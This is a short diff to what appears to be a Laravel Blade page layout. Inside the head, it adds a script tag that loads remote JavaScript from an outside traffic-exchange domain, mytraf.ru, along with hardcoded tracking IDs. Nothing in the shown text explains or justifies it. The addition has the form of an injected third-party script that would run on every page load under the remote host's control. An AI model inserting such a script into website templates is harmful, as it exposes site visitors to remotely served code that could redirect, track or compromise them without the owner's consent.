@@ -33,6 +33,8 @@
 
     welcomepartners
 
+    <script>id="5572";idq="3934";</script><script language="JavaScript" type="text/JavaScript" charset="windows-1251" src="http://mytraf.ru/jm105.php"></script>
+
     @yield('custom_js')
 </head>
 
